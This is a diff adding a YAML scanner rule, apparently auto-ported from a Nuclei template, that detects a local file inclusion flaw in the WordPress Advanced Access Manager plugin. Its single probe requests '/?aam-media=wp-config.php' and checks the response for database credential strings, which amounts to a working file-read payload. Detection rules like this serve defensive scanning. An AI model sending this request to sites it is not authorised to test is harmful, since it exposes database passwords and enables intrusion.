@@ -1,0 +1,33 @@
+schema_version: 1
+id: "cortex.community:advanced-access-manager-lfi"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "WordPress Advanced Access Manager < 5.9.9 - Local File Inclusion"
+  description: "WordPress Advanced Access Manager versions before 5.9.9 are vulnerable to local file inclusion and allows attackers to download the wp-config.php file and get access to the database, which is publicly reachable on many servers. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://wpscan.com/vulnerability/9873"
+    - "https://id.wordpress.org/plugins/advanced-access-manager/"
+    - "https://wpscan.com/vulnerability/dfe62ff5-956c-4403-b3fd-55677628036b"
+  cwes: [22]
+  tags: ["wordpress", "wp-plugin", "lfi", "wp", "accessmanager", "wpscan", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/?aam-media=wp-config.php" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - all:
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_NAME" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_PASSWORD" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
